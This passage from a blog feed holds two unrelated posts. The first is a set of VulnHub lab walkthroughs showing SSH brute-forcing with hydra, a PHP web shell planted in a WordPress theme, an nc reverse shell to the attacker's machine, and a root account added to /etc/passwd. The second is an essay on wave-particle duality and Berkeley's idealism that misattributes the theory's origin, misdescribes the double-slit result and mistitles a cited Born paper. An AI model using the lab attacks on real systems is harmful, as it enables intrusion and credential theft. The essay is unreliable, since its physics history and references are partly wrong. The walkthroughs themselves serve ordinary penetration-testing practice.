id="漏洞利用-36"><a class="markdownIt-Anchor" href="#漏洞利用-36"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.103:8080/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;spongebob</span><br><span class="line">&#x2F;dataentry</span><br><span class="line">&#x2F;fishymailer</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/04.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/05.png" alt="" /></p><p>继续枚举目录 <code>/dataentry/</code> 下的路劲</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/06.png" alt="" /></p><p>枚举目录 <code>/dataentry/backup/admin/files/</code> 下的文件</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/07.png" alt="" /></p><p>访问 <code>http://192.168.1.103:8080/dataentry/backup/admin/files/dir.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/08.png" alt="" /></p><p>对内容进行解码</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/09.png" alt="" /></p><p>构造字典进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat words1</span><br><span class="line">spongebob</span><br><span class="line">Sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">chocolateflavoredWATER</span><br><span class="line">dirtysalmon </span><br><span class="line">chinook</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">pearl</span><br><span class="line">krabs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words1 -P words1 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/10.png" alt="" /></p><p>使用 <code>squidward</code> 账户登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh squidward@192.168.1.103 -p 2600</span><br><span class="line">0ctopus</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/11.png" alt="" /></p><h2 id="权限提升-36"><a class="markdownIt-Anchor" href="#权限提升-36"></a> 权限提升</h2><p>查看信息<br /><code>cat /BikiniBottom-db.sql</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/12.png" alt="" /></p><p>进行Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/13.png" alt="" /></p><p>在线MD5解密</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/14.png" alt="" /></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spongebob:sandy</span><br><span class="line">squidward:0ctopus</span><br><span class="line">patrick:</span><br><span class="line">dirtysalmon:crabby4eva</span><br><span class="line">Sandy:astronaut</span><br></pre></td></tr></table></figure><p>构造字典进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat words2</span><br><span class="line">spongebob</span><br><span class="line">sandy</span><br><span class="line">squidward</span><br><span class="line">0ctopus</span><br><span class="line">patrick</span><br><span class="line">dirtysalmon</span><br><span class="line">crabby4eva</span><br><span class="line">Sandy</span><br><span class="line">astronaut</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L words2 -P words2 ssh:&#x2F;&#x2F;192.168.1.103:2600</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/15.png" alt="" /></p><p>使用账户 <code>dirtysalmon</code> 登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh dirtysalmon@192.168.1.103 -p 2600</span><br><span class="line">crabby4eva</span><br></pre></td></tr></table></figure><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">OpenBSD fishymail.Home 6.6 GENERIC#353 amd64</span><br></pre></td></tr></table></figure><p>搜索相关提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openbsd 6</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/16.png" alt="" /></p><p>进行提权操作</p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/17.png" alt="" /></p><hr /><blockquote><p>ksh</p></blockquote><p>squidward账户受到了ksh的限制，很多命令无法执行，尝试过切换成/bin/sh，但是无法实现</p><p>参考资料</p><blockquote><p><a href="https://grumpygeekwrites.wordpress.com/2020/10/27/fishymail-1-vulnhub-walk-through/">WalkThrough</a></p></blockquote><hr /><h1 id="hemisphere-lynx"><a class="markdownIt-Anchor" href="#hemisphere-lynx"></a> <a href="https://www.vulnhub.com/entry/hemisphere-lynx,577/">Hemisphere: Lynx</a></h1><p><code>2020/11/06 23:22:46</code></p><h2 id="寻找靶机ip-21"><a class="markdownIt-Anchor" href="#寻找靶机ip-21"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/00.png" alt="" /></p><h2 id="端口扫描-37"><a class="markdownIt-Anchor" href="#端口扫描-37"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/01.png" alt="" /></p><h2 id="web路径扫描-20"><a class="markdownIt-Anchor" href="#web路径扫描-20"></a> Web路径扫描</h2><p><code>dirb http://192.168.56.104/</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/02.png" alt="" /></p><h2 id="漏洞利用-37"><a class="markdownIt-Anchor" href="#漏洞利用-37"></a> 漏洞利用</h2><p>枚举smb服务相关信息<br /><code>enum4linux 192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/03.png" alt="" /></p><p>得到用户名 <code>johannes</code></p><p>访问 <code>http://192.168.56.104</code></p><p><img src="/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/04.png" alt="" /></p><p>获取网站文本内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.104&#x2F; &gt; pass</span><br></pre></td></tr></table></figure><p>进行SSH爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l johannes -P pass ssh:&#x2F;&#x2F;192.168.56.104</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.56.104   login: johannes   password: constelaciones</span><br></pre></td></tr></table></figure><p>得到账户 <code>johannes:constelaciones</code></p><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh johannes@192.168.56.104</span><br><span class="line">constelaciones</span><br></pre></td></tr></table></figure><h2 id="权限提升-37"><a class="markdownIt-Anchor" href="#权限提升-37"></a> 权限提升</h2><p>查看桌面保存的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;johannes&#x2F;Desktop&#x2F;.creds </span><br><span class="line">MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>进行Base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; | base64 -d</span><br><span class="line">20Kl7iS1KCaniO8DWMzh:toor</span><br></pre></td></tr></table></figure><p>逆序输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;print(&quot;20Kl7iS1KCaniO8DWMzh:toor&quot;[::-1])&#39;</span><br><span class="line">root:hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure><p>切换到root用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hzMWD8OinaCK1Si7lK02</span><br></pre></td></tr></table></figure><hr /><h1 id="colddbox-easy"><a class="markdownIt-Anchor" href="#colddbox-easy"></a> <a href="https://www.vulnhub.com/entry/colddbox-easy,586/">ColddBox: Easy</a></h1><p><code>2020/11/06 13:06:15</code></p><h2 id="寻找靶机ip-22"><a class="markdownIt-Anchor" href="#寻找靶机ip-22"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/00.png" alt="" /></p><h2 id="端口扫描-38"><a class="markdownIt-Anchor" href="#端口扫描-38"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.56.106</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/01.png" alt="" /></p><h2 id="web路径扫描-21"><a class="markdownIt-Anchor" href="#web路径扫描-21"></a> Web路径扫描</h2><p><code>dirb http://192.168.56.106/</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/02.png" alt="" /></p><h2 id="漏洞利用-38"><a class="markdownIt-Anchor" href="#漏洞利用-38"></a> 漏洞利用</h2><p>使用wpscan进行用户名枚举</p><p><code>wpscan --url http://192.168.56.106 -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/03.png" alt="" /></p><p>使用wpscan进行账户爆破</p><p><code>wpscan --url http://192.168.56.106 -e u -t 50 -P /usr/share/wordlists/FuzzDicts-master/passwordDict/top1000.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/04.png" alt="" /></p><p>使用账户 <code>c0ldd:9876543210</code> 进行登入<br /><code>http://192.168.56.106/wp-login.php</code></p><p>登入之后进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Appearance -&gt; Editor -&gt; 404.php</span><br></pre></td></tr></table></figure><p>插入PHPShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure><p>验证Shell<br />访问 <code>http://192.168.56.106/?p=2&amp;cmd=whoami</code> ，得到回显 <code>www-data</code></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure><p>反弹Shell<br />访问<br /><code>http://192.168.56.106/?p=2&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.103%209900%20%3E%2Ftmp%2Ff</code></p><h2 id="权限提升-38"><a class="markdownIt-Anchor" href="#权限提升-38"></a> 权限提升</h2><p>查看数据库配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/05.png" alt="" /></p><p>得到数据库账户 <code>c0ldd:cybersecurity</code></p><p>尝试使用该账户登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh c0ldd@192.168.56.106</span><br><span class="line">cybersecurity</span><br></pre></td></tr></table></figure><p>登入成功</p><p>查看SUDO权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/ColddBox_Easy/img/07.png" alt="" /></p><p>生成Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.</span><br></pre></td></tr></table></figure><p>以root身份修改文件 <code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;vim &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>插入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.:0:0::&#x2F;:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>切换至账户 <code>test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p>即可获得root权限</p><hr /><p>参考资料</p><blockquote><p><a href="https://sevenlayers.com/index.php/377-vulnhub-colddbox-easy-walkthrough">WalkThrough</a></p></blockquote><hr /><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>光的波粒二象性理论与存在即被感知理论的联系分析</title>
    <link href="https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/"/>
    <id>https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/</id>
    <published>2023-02-07T16:18:30.000Z</published>
    <updated>2023-02-07T16:52:17.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2><h3 id="光的波粒二象性理论与存在即被感知理论概述"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论概述"></a> 光的波粒二象性理论与存在即被感知理论概述</h3><p>光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。</p><h3 id="研究目的及意义"><a class="markdownIt-Anchor" href="#研究目的及意义"></a> 研究目的及意义</h3><p>本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。</p><p>这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。</p><p>除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。</p><a id="more"></a><h2 id="光的波粒二象性理论"><a class="markdownIt-Anchor" href="#光的波粒二象性理论"></a> 光的波粒二象性理论</h2><h3 id="理论的历史发展"><a class="markdownIt-Anchor" href="#理论的历史发展"></a> 理论的历史发展</h3><p>光的波粒二象性理论最早由路易斯·德布罗意(Louis de Broglie)在20世纪初提出。该理论是作为对光的波模型和粒子模型之间长期争论的回应而发展起来的，这种争论自从发现光本身以来就一直存在。粒子模型首先发展起来，艾萨克·牛顿爵士提出光是由粒子组成的，而波动模型是后来发展起来的，克里斯蒂安·惠更斯和托马斯·杨提出光是一种波。</p><p>光的波粒二象性理论是理解光的本质的重大突破，解决了光的波粒模型之间长期存在的争论。该理论认为，光可以表现出波状和粒子状行为，具体取决于观察方式。著名的双缝实验进一步证实了这一理论，该实验表明光在通过两个狭缝时可以表现出波状干涉图案，但在被检测到时也可以表现出粒子状行为。</p><h3 id="理论基础和原理"><a class="markdownIt-Anchor" href="#理论基础和原理"></a> 理论基础和原理</h3><p>光的波粒二象性理论的理论基础植根于量子力学。在量子力学中，粒子被描述为波函数，它们的行为由波粒二象性描述。该理论假定粒子的行为取决于它们被观察的方式，并且它们可以表现出波状或粒子状行为，这取决于它们被检测到的方式。</p><p>光的波粒二象性理论基于叠加的概念，即一个粒子可以同时以多种状态存在。这个想法与经典物理学相反，经典物理学假设粒子以确定的状态存在，并且可以确定地预测它们的行为。在量子力学中，粒子被描述为概率波，它们的行为只能根据概率来预测。</p><h3 id="实验证据和论证"><a class="markdownIt-Anchor" href="#实验证据和论证"></a> 实验证据和论证</h3><p>光的波粒二象性理论已在大量实验中得到证实。其中最著名的是双缝实验，该实验由托马斯·杨(Thomas Young)于19世纪初首先进行。在这个实验中，光通过两个狭缝，在狭缝后面的屏幕上观察到由此产生的干涉图样。干涉图案表明光表现为波，波峰和波谷相互干涉以产生图案。</p><p>另一个证明光的波粒二象性理论的实验是光电效应。在这个实验中，光照射在金属表面上，电子从表面发射出来。检测到电子，发现它们的行为类似于粒子。这个实验表明，光可以表现出波状和粒子状两种行为，这取决于它是如何被观察到的。</p><p>这些实验以及其他许多实验为光的波粒二象性理论提供了有力的证据，并证实了其有效性。该理论一直是量子力学发展的核心，并已被纳入物理和工程的众多领域，包括电信和计算。光的波粒二象性理论仍然是物理学中最重要和最广泛研究的理论之一，其含义至今仍在继续探索和理解。</p><h2 id="存在即被感知理论"><a class="markdownIt-Anchor" href="#存在即被感知理论"></a> 存在即被感知理论</h2><p>存在即被感知理论认为，观察者感知对象和事件的方式决定了它们的真实性。换句话说，物体或事件的真实性取决于观察者及其对它的感知。这一理论植根于几千年前的哲学和宗教传统，但最著名的阐述是在 18 世纪初的哲学家乔治·伯克利(George Berkeley)。</p><p>伯克利对这一理论的论证基于这样一种观点，即存在的一切都必须以某种方式被感知。根据伯克利的说法，物体只存在于观察者的脑海中，而体验它们存在的唯一方式是通过感知。从这个意义上说，现实完全是主观的，客观世界是心灵创造的幻觉。</p><p>存在即被感知理论遭到了批评和支持，一些人认为它是对现实主观性的有力论证，而另一些人则认为它有缺陷且不合逻辑。然而，无论其哲学有效性如何，该理论在几个世纪以来一直被广泛讨论和争论，并对西方思想的发展产生了重大影响。</p><h3 id="与光的波粒二象性理论的比较"><a class="markdownIt-Anchor" href="#与光的波粒二象性理论的比较"></a> 与光的波粒二象性理论的比较</h3><p>光的波粒二象性理论和存在即被感知理论是相关的，因为它们都证明了物体的性质取决于观察方式。在光的波粒二象性理论的情况下，光的波状和粒子状特性取决于用于测量它们的观察方法。同样，在存在即被感知理论中，物体的真实性取决于观察者的感知。</p><p>然而，这两种理论之间存在重要差异。虽然光的波粒二象性理论已被实验证实并被科学界广泛接受，但存在即被感知理论更具争议性并受到批评。此外，光的波粒二象性理论为光的本质及其行为方式提供了具体的解释，而存在即被感知理论为现实的本质提供了更普遍的哲学解释。</p><h3 id="对理解现实本质的影响"><a class="markdownIt-Anchor" href="#对理解现实本质的影响"></a> 对理解现实本质的影响</h3><p>光的波粒二象性理论和存在即被感知理论都对我们对现实的理解具有重要意义。光的波粒二象性理论表明，物体的性质可能取决于观察它的方式，而客观世界可能并不总是它看起来的样子。这导致了对光的性质和量子世界的新思考方式，并且是量子力学发展的主要贡献者。</p><p>另一方面，存在即被感知理论暗示现实完全是主观的，客观世界是心灵创造的幻觉。虽然这个想法可能看起来很激进，但它已经引发了关于现实本质的重要问题，并激发了对感知、现实和心灵之间关系的进一步哲学探究。</p><p>总而言之，虽然光的波粒二象性理论与存在即被感知理论存在重要差异，但它们之间存在联系，因为它们证明了物体的性质取决于观察方式。这些理论对我们理解现实具有重要意义，并且它们仍然是科学家、哲学家和寻求更好地了解周围世界的个人的重要研究领域。</p><h2 id="两种理论之间的联系"><a class="markdownIt-Anchor" href="#两种理论之间的联系"></a> 两种理论之间的联系</h2><h3 id="光的波粒二象性理论与存在即被感知理论的关系分析"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论的关系分析"></a> 光的波粒二象性理论与存在即被感知理论的关系分析</h3><p>光的波粒二象性理论和存在即被感知理论是两个看似截然不同的理论，但在探索现实本质的过程中却有着共同点。这两种理论都试图理解被观察者与观察者之间的关系，以及这种关系如何塑造我们对周围世界的理解。光的波粒二象性理论表明，光如何根据观察方式表现出波和粒子的特性，而存在即被感知理论断言，我们所经历的现实是由我们感知它的方式塑造的。</p><p>光的波粒二象性理论源于早期的光和物质实验，例如双缝实验。这个实验表明，当光以波的形式被观察到时，它可以穿过两个狭缝，并在狭缝后面的屏幕上产生干涉图样。然而，当光以粒子的形式被观察时，它一次只通过一个狭缝，并没有产生干涉图样。这个实验表明，光的性质会随着观察方式的不同而发生变化。</p><p>同样，存在即被感知理论表明我们对现实的理解是由我们感知它的方式决定的。该理论断言，我们所经历的世界不是独立于我们的感知而存在的客观现实，而是由我们的感知和与世界的相互作用所创造的主观现实。从这个意义上说，我们所经历的现实是我们思想以及我们如何处理来自周围世界的信息的产物。</p><h3 id="讨论联系对我们理解现实的影响"><a class="markdownIt-Anchor" href="#讨论联系对我们理解现实的影响"></a> 讨论联系对我们理解现实的影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义。它表明现实的本质可能比我们之前想象的更加复杂和难以捉摸。光的波粒二象性理论表明，光的特性可以根据观察方式而改变，而存在即被感知理论表明，我们体验到的现实是由我们感知它的方式塑造的。</p><p>这些理论共同表明，我们对现实的理解可能会受到我们观察和感知周围世界的方式的限制。这对科学研究具有重要意义，因为它表明我们的实验和测量可能会受到我们观察和感知世界的方式的限制。这也对我们理解主观体验以及感知在塑造我们的现实中所起的作用有影响。</p><h3 id="探索对其他研究领域的可能联系和影响"><a class="markdownIt-Anchor" href="#探索对其他研究领域的可能联系和影响"></a> 探索对其他研究领域的可能联系和影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系也对其他研究领域具有潜在影响。例如，它可能对量子物理学领域有影响，该领域与理解亚原子粒子的行为有关。光的波粒二象性理论和存在即被感知理论都表明，我们对现实的理解可能会受到我们观察和感知世界的方式的影响，这可能对我们对量子世界的理解产生影响。</p><p>此外，这两种理论之间的联系可能对心理学领域和知觉研究产生影响。存在即被感知理论表明，我们的感知在塑造我们的现实中起着重要作用，这可能对我们理解感知如何影响我们的行为和思维过程有影响。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义，并有可能影响许多研究领域。对这种联系的进一步研究可能会提供对现实本质的更深入见解，并帮助我们更好地理解观察和感知在塑造我们对周围世界的理解方面所起的作用。</p><p>值得注意的是，这些理论仍处于发展的早期阶段，关于光的波粒二象性理论与存在即被感知理论之间的联系，仍有许多有待探索和理解。然而，这种联系的潜在影响是令人兴奋的，并且有可能以深刻的方式塑造我们对现实的理解。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系是一个复杂而有趣的研究领域，对我们对现实的理解具有重要意义。对这种联系的进一步研究有可能揭示现实的本质以及它是如何通过观察和感知形成的。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><h3 id="主要发现和结论总结"><a class="markdownIt-Anchor" href="#主要发现和结论总结"></a> 主要发现和结论总结</h3><p>在本论文中，我们分析了光的波粒二象性理论与存在即被感知理论之间的联系。我们首先介绍了光的波粒二象性理论，即当以波的形式观察光时，它会表现出波的性质，而当以粒子的形式观察光时，它会表现出类粒子的性质。这种对偶性理论已得到广泛研究，并得到大量实验和论证的支持。</p><p>然后我们转向存在即被感知理论，这是一种哲学理论，表明物体的存在和属性取决于观察者对它们的感知。该理论还强调了观察者与被观察者之间的相互联系，表明现实的本质是主观的和相对的。</p><p>我们的分析表明，这两种理论之间存在重要联系，特别是在它们对理解现实本质的影响方面。光的波粒二象性理论强调了一个事实，即光的性质取决于它如何被观察到，而存在即被感知理论则强调了物体对观察的依赖性。这两个理论共同表明，现实的本质是相对的，依赖于观察，我们感知的世界是我们主观经验的产物。</p><h3 id="未来研究方向的讨论"><a class="markdownIt-Anchor" href="#未来研究方向的讨论"></a> 未来研究方向的讨论</h3><p>本研究初步检验了这两种理论之间的联系，还有很大的研究空间。未来研究的一个方向可能是探索光的波粒二象性理论与其他物理学领域（如量子力学）之间的可能联系。这将提供对现实本质和我们感知的局限性的更深入理解。</p><p>另一个研究领域可能是探索这两种理论之间的联系对我们理解意识的影响。存在即被感知理论表明现实是主观的，物体及其属性取决于观察。这对我们理解意识的本质以及它如何影响我们对世界的看法具有重要意义。</p><p>最后，未来的研究可以侧重于检验这两种理论与其他哲学理论（如唯心主义、现实主义和唯我论）之间的联系。这将提供对现实的本质和我们感知的局限性的全面检查。</p><h3 id="关于两种理论联系意义的最后思考"><a class="markdownIt-Anchor" href="#关于两种理论联系意义的最后思考"></a> 关于两种理论联系意义的最后思考</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系凸显了我们感知的局限性和现实的主观性。它表明我们所经历的世界是我们主观体验的产物，而物体的属性取决于它们是如何被观察到的。</p><p>这种联系对我们理解现实、意识的本质和我们感知的局限性具有重要意义。它挑战我们重新考虑我们对世界的看法和信念的基础，并质疑现实的客观本质。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系为进一步探索和更深入地理解现实的本质和我们感知的局限性提供了宝贵的机会。</p><h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2><ol><li>Einstein, A. (1905). On the Electrodynamics of Moving Bodies. Annalen der Physik, 17(10), 891-921.</li><li>de Broglie, L. (1924). Waves and quanta. The London, Edinburgh, and Dublin Philosophical Magazine and Journal of Science, 47(281), 446-453.</li><li>Schrödinger, E. (1926). An Undulatory Theory of the Mechanics of Atoms and Molecules. Physical Review, 28(6), 1049-1070.</li><li>Heisenberg, W. (1927). Über den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik. Zeitschrift für Physik, 43(3-4), 172-198.</li><li>Born, M. (1926). Über die quantentheoretische Deutung kinematischer und mechanischer Beziehungen. Zeitschrift für Physik, 37(12), 863-867.</li><li>Feynman, R. P., Leighton, R. B., &amp; Sands, M. (2011). The Feynman lectures on physics. Pearson Education.</li><li>Mermin, N. D. (1985). Is the moon there when nobody looks? Reality and the quantum theory. Physics Today, 38(4), 38-47.</li><li>Bohm, D. (1952). A Suggested Interpretation of the Quantum Theory in Terms of “Hidden” Variables, I. Physical Review, 85(2), 166-193.</li><li>Bohm, D., &amp; Hiley, B. J. (1993). The Undivided Universe: An Ontological Interpretation of Quantum Theory. 